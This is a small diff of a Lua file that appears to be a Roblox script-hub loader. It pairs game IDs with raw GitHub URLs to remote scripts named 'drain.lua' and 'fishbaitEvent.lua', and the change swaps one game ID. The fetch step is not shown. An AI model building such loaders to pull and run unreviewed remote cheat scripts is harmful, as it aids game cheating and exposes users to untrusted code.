@@ -1,7 +1,7 @@
 print("test")
 local GAME1 = 10267363348
 local SCRIPT_URL1 = "https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/drain.lua"
-local GAME2 = 99702578544768
+local GAME2 = 9330616906
 local SCRIPT_URL2 = "https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/fishbaitEvent.lua"
 
 if game.GameId == GAME1 then
